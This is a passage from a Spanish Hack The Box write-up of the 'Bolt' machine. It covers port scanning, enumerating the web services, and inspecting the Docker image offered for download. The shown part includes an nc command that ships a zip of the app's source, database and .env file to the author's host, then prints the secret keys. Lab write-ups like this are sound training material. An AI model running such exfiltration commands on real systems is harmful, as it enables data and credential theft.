<!doctype html><html lang="es"><head><title>Bolt | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene varios subdominios y una imagen de Docker con mucha información necesaria para explotar los servicios web. Existe una vulnerabilidad de SSTI en la comunicación entre dos servicios. Luego, podemos extraer una clave privada PGP de la caché de Google Chrome y descrifrar un mensaje. Para comprometer esta máquina, se necesitan conocimientos avanzados de Docker y habilidades básicas de explotación web"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene varios subdominios y una imagen de Docker con mucha información necesaria para explotar los servicios web. Existe una vulnerabilidad de SSTI en la comunicación entre dos servicios. Luego, podemos extraer una clave privada PGP de la caché de Google Chrome y descrifrar un mensaje. Para comprometer esta máquina, se necesitan conocimientos avanzados de Docker y habilidades básicas de explotación web"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina tiene varios subdominios y una imagen de Docker con mucha información necesaria para explotar los servicios web. Existe una vulnerabilidad de SSTI en la comunicación entre dos servicios. Luego, podemos extraer una clave privada PGP de la caché de Google Chrome y descrifrar un mensaje. Para comprometer esta máquina, se necesitan conocimientos avanzados de Docker y habilidades básicas de explotación web"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene varios subdominios y una imagen de Docker con mucha información necesaria para explotar los servicios web. Existe una vulnerabilidad de SSTI en la comunicación entre dos servicios. Luego, podemos extraer una clave privada PGP de la caché de Google Chrome y descrifrar un mensaje. Para comprometer esta máquina, se necesitan conocimientos avanzados de Docker y habilidades básicas de explotación web"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene varios subdominios y una imagen de Docker con mucha información necesaria para explotar los servicios web. Existe una vulnerabilidad de SSTI en la comunicación entre dos servicios. Luego, podemos extraer una clave privada PGP de la caché de Google Chrome y descrifrar un mensaje. Para comprometer esta máquina, se necesitan conocimientos avanzados de Docker y habilidades básicas de explotación web"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/Bolt/Bolt.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Bolt/Bolt.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Bolt/Bolt.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Bolt"><meta property="twitter:title" content="Bolt"><meta property="og:title" content="Bolt"><meta property="og:url" content="https://7rocky.github.io/htb/bolt/"><meta itemprop="keywords" content="flask,docker,pgp-keys,password-reuse,ssti,rce,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/bolt/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/bolt/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/bolt/&text=Bolt" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/bolt/&title=Bolt" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Bolt</h1><time class="mt4 f6 dib tracked" datetime="2022-02-19T00:00:00+01:00">19 / 02 / 2022</time><br><p class="mb4 f6 dib tracked">23 minutos de lectura</p></header><div class="htb-image"><img alt="Bolt" src="/images/HTB/Bolt/Bolt.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/flask" title="Flask">Flask</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/pgp-keys" title="Claves PGP">Claves PGP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/ssti" title="Server-Side Template Injection">Server-Side Template Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#inspeccionando-la-imagen-de-docker">Inspeccionando la imagen de Docker</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#accediendo-a-bolthtb-como-admin">Accediendo a <code>bolt.htb</code> como <code>admin</code></a></li><li><a href="#profundizando-aún-más-en-la-imagen-de-docker">Profundizando aún más en la imagen de Docker</a></li><li><a href="#encontrando-un-ssti">Encontrando un SSTI</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-eddie">Movimiento lateral al usuario <code>eddie</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#buscando-una-clave-privada-pgp">Buscando una clave privada PGP</a></li><li><a href="#descifrando-un-mensaje-pgp">Descifrando un mensaje PGP</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.114</li><li><strong>Fecha</strong>: 25 / 09 / 2021</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.114 -p 22,80,443
Nmap scan report for 10.10.11.114
Host is up (0.038s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU  
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 16.23 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS).</p><p>Por otro lado, se ve que el servidor está utilizando <em>virtual hosts</em> (listado en el certificado SSL), por lo que podemos poner los dominios <code>bolt.htb</code> y <code>passbolt.bolt.htb</code> en el archivo <code>/etc/hosts</code>.</p><h2 id="enumeración">Enumeración</h2><p>Si entramos en <code>http://bolt.htb</code>, veremos una página web como la siguiente:</p><p><img src="/images/HTB/Bolt/Bolt-bolt.htb.png" alt="bolt.htb"></p><p>Tenemos además la siguiente página de inicio de sesión:</p><p><img src="/images/HTB/Bolt/Bolt-login.png" alt="bolt.htb login"></p><p>Pero no tenemos ningunas credenciales potenciales. Aunque hay una página de registro, al enviar el formulario, el servidor devuelve un error <code>500 Internal Server Error</code>, con lo cual la funcionalidad debe de estar deshabilitada.</p><p>Por la respuesta, se puede deducir que el servidor está utilizando Flask:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> bolt.htb/register -vd <span class="code-dark-yellow">'username=asdf&email=asdf%40bolt.htb&password=asdf'</span>
*   Trying 10.10.11.114:80...
* Connected to bolt.htb (10.10.11.114) port 80 (#0)
&gt; POST /register HTTP/1.1
&gt; Host: bolt.htb
&gt; User-Agent: curl/7.79.1
&gt; Accept: */*
&gt; Content-Type: application/x-www-form-urlencoded
&gt; Content-Length: 49
&gt;
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 500 INTERNAL SERVER ERROR
&lt; Server: nginx/1.18.0 (Ubuntu)
&lt; Date:
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 290
&lt; Connection: keep-alive
&lt;
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;500 Internal Server Error&lt;/title&gt;
&lt;h1&gt;Internal Server Error&lt;/h1&gt;
&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;  
* Connection #0 to host bolt.htb left intact
</code></pre></div><p>Esto es porque Flask pone en mayúsculas el estado de respuesta HTTP (en este caso <code>HTTP/1.1 500 INTERNAL SERVER ERROR</code>).</p><p>El segundo subdominio que tenemos es <code>passbolt.bolt.htb</code>, pero no podemos hacer nada aquí:</p><p><img src="/images/HTB/Bolt/Bolt-passbolt.png" alt="passbolt.bolt.htb"></p><h3 id="inspeccionando-la-imagen-de-docker">Inspeccionando la imagen de Docker</h3><p>Existe una imagen de Docker que podemos descargar de <code>bolt.htb</code> en formato TAR (<code>image.tar</code>):</p><p><img src="/images/HTB/Bolt/Bolt-docker-download.png" alt="Descarga de la imagen de Docker"></p><p>Podemos importar la imagen a Docker de la siguiente manera:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> image load -i <span class="mtku">image.tar</span>
3fc64803ca2d: Loading layer [==================================================&gt;]  4.463MB/4.463MB  
73f2f98bc222: Loading layer [==================================================&gt;]   7.68kB/7.68kB
8f2df5d06a26: Loading layer [==================================================&gt;]  62.86MB/62.86MB
a1e4f9dc4110: Loading layer [==================================================&gt;]  57.57MB/57.57MB
f0c4120bc314: Loading layer [==================================================&gt;]  29.79MB/29.79MB
14ec2ed1c30d: Loading layer [==================================================&gt;]  6.984MB/6.984MB
68c03965721f: Loading layer [==================================================&gt;]  3.072kB/3.072kB
fec67b58fd48: Loading layer [==================================================&gt;]  19.97kB/19.97kB
7fa1531c7420: Loading layer [==================================================&gt;]  7.168kB/7.168kB
e45bbea785e3: Loading layer [==================================================&gt;]  15.36kB/15.36kB
ac16908b339d: Loading layer [==================================================&gt;]  8.192kB/8.192kB
Loaded image: flask-dashboard-adminlte_appseed-app:latest

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> images
REPOSITORY                             TAG       IMAGE ID       CREATED        SIZE
flask-dashboard-adminlte_appseed-app   latest    859e74798e6c   6 months ago   154MB
</code></pre></div><p>Ahora, podemos ejecutar la imagen en un contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run --rm -p 5005:5005 -it flask-dashboard-adminlte_appseed-app
[2021-10-13 08:44:27 +0000] [1] [DEBUG] Current configuration:
  config: gunicorn-cfg.py
  bind: ['0.0.0.0:5005']
  ...
[2021-10-13 08:44:27 +0000] [1] [INFO] Starting gunicorn 20.0.4
[2021-10-13 08:44:27 +0000] [1] [DEBUG] Arbiter booted
[2021-10-13 08:44:27 +0000] [1] [INFO] Listening at: http://0.0.0.0:5005 (1)  
[2021-10-13 08:44:27 +0000] [1] [INFO] Using worker: sync
[2021-10-13 08:44:27 +0000] [15] [INFO] Booting worker with pid: 15
[2021-10-13 08:44:27 +0000] [1] [DEBUG] 1 workers
[2021-10-13 08:44:29,656] INFO in run: DEBUG       = True
[2021-10-13 08:44:29,656] INFO in run: Environment = Debug
[2021-10-13 08:44:29,657] INFO in run: DBMS        = sqlite:////db.sqlite3
</code></pre></div><p>Se puede ver que la imagen está ejecutando Flask en el puerto 5005 del contenedor (se ve después de correrlo la primera vez, luego se añade el parámetro <code>-p 5005:5005</code> al comando <code>docker run</code>).</p><p>El contenedor sirve una página web que redirige a un formulario de inicio de sesión:</p><p><img src="/images/HTB/Bolt/Bolt-docker-login.png" alt="Inicio de sesión en el contenedor de Docker"></p><p>Esta vez, somos capaces de registrar un nuevo perfil y acceder a AdminLTE 3:</p><p><img src="/images/HTB/Bolt/Bolt-docker-adminlte.png" alt="AdminLTE 3 en el contenedor de Docker"></p><p>No hay nada interesante en este <em>dashboard</em>. Ahora que el contenedor de Docker está corriendo, podemos ejecutar <code>sh</code>, para ver si hay archivos interesantes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> ps -a
CONTAINER ID   IMAGE                                  COMMAND                  CREATED         STATUS         PORTS                    NAMES
ffd733413c3e   flask-dashboard-adminlte_appseed-app   "gunicorn --config g…"   2 minutes ago   Up 2 minutes   0.0.0.0:5005->5005/tcp   friendly_mcnulty  

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> exec -it ffd733413c3e sh
/ # ls -la
total 108
drwxr-xr-x    1 root     root          4096 Oct 13 08:44 <span class="code-blue">.</span>
drwxr-xr-x    1 root     root          4096 Oct 13 08:44 <span class="code-blue">..</span>
-rwxr-xr-x    1 root     root             0 Oct 13 08:44 <span class="code-green">.dockerenv</span>
-rw-r--r--    1 root     root           142 Mar  5  2021 .env
drwxr-xr-x    2 root     root          4096 Mar  5  2021 <span class="code-blue">__pycache__</span>
drwxr-xr-x    1 root     root          4096 Mar  5  2021 <span class="code-blue">app</span>
drwxr-xr-x    2 root     root          4096 Mar  6  2019 <span class="code-blue">bin</span>
-rw-r--r--    1 root     root          1448 Mar  5  2021 config.py
-rw-r--r--    1 root     root         16384 Oct 13 08:55 db.sqlite3
drwxr-xr-x    5 root     root           360 Oct 13 08:44 <span class="code-blue">dev</span>
drwxr-xr-x    1 root     root          4096 Oct 13 08:44 <span class="code-blue">etc</span>
-rw-r--r--    1 root     root           198 Mar  5  2021 gunicorn-cfg.py
drwxr-xr-x    2 root     root          4096 Mar  6  2019 <span class="code-blue">home</span>
drwxr-xr-x    1 root     root          4096 Mar  6  2019 <span class="code-blue">lib</span>
drwxr-xr-x    5 root     root          4096 Mar  6  2019 <span class="code-blue">media</span>
drwxr-xr-x    2 root     root          4096 Mar  6  2019 <span class="code-blue">mnt</span>
dr-xr-xr-x  187 root     root             0 Oct 13 08:44 <span class="code-blue">proc</span>
-rw-r--r--    1 root     root           116 Mar  5  2021 requirements.txt
drwx------    1 root     root          4096 Mar  5  2021 <span class="code-blue">root</span>
drwxr-xr-x    2 root     root          4096 Mar  6  2019 <span class="code-blue">run</span>
-rw-r--r--    1 root     root           955 Mar  5  2021 run.py
drwxr-xr-x    2 root     root          4096 Mar  6  2019 <span class="code-blue">sbin</span>
drwxr-xr-x    2 root     root          4096 Mar  6  2019 <span class="code-blue">srv</span>
dr-xr-xr-x   13 root     root             0 Oct 13 08:44 <span class="code-blue">sys</span>
drwxrwxrwt    1 root     root          4096 Oct 13 08:44 <span class="code-blue">tmp</span>
drwxr-xr-x    1 root     root          4096 Mar  5  2021 <span class="code-blue">usr</span>
drwxr-xr-x    1 root     root          4096 Mar  6  2019 <span class="code-blue">var</span>
/ # ls -la app
total 24
drwxr-xr-x    1 root     root          4096 Mar  5  2021 <span class="code-blue">.</span>
drwxr-xr-x    1 root     root          4096 Oct 13 08:55 <span class="code-blue">..</span>
-rw-r--r--    1 root     root          1058 Mar  5  2021 __init__.py
drwxr-xr-x    1 root     root          4096 Mar  5  2021 <span class="code-blue">__pycache__</span>
drwxr-xr-x    1 root     root          4096 Mar  5  2021 <span class="code-blue">base</span>
drwxr-xr-x    1 root     root          4096 Mar  5  2021 <span class="code-blue">home</span>
</code></pre></div><p>Podemos encontrar una base de datos SQLite3 y el código fuente de la aplicación de Flask. Podemos transferir estos ficheros a nuestra máquina para analizarlos. Para ello, podemos comprimirlos en un archivo ZIP y después utilizar <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/ # apk update
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz  
v3.7.3-184-gffd32bfd09 [http://dl-cdn.alpinelinux.org/alpine/v3.7/main]
v3.7.3-194-gcddd1b2302 [http://dl-cdn.alpinelinux.org/alpine/v3.7/community]
OK: 9054 distinct packages available
/ # apk add zip
(1/1) Installing zip (3.0-r4)
Executing busybox-1.27.2-r11.trigger
OK: 72 MiB in 27 packages
/ # zip -r src.zip .env db.sqlite3 *.py requirements.txt app
/ # nc 192.168.1.37 4444 &lt; src.zip
</code></pre></div><p>Desde nuestra máquina, cogemos el archivo ZIP y lo descomprimimos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444 > src.zip
Ncat: Version 7.92 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.37.
Ncat: Connection from 192.168.1.37:52425.

<span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> <span class="mtku">src.zip</span>
</code></pre></div><p>Ahora somos capaces de ver el contenido de la base de datos SQLite3, pero solamente contiene el usuario que acabamos de crear:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlite3</span> <span class="mtku">db.sqlite3</span>
SQLite version 3.32.3
Enter ".help" for usage hints.
sqlite&gt; .tables
User
sqlite&gt; select * from User;
1|asdf|asdf@bolt.htb|$1$wJuqE5Tc$rZXG8CmAsT8YAIfHAJdkr.||  
sqlite&gt; .quit
</code></pre></div><p>Leyendo los demás archivos, vemos uno llamado <code>.env</code> que contiene una clave secreta:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">DEBUG=True
SECRET_KEY=S3cr3t_K#Key  
DB_ENGINE=postgresql
DB_NAME=appseed-flask
DB_HOST=localhost
DB_PORT=5432
DB_USERNAME=appseed
DB_PASS=pass
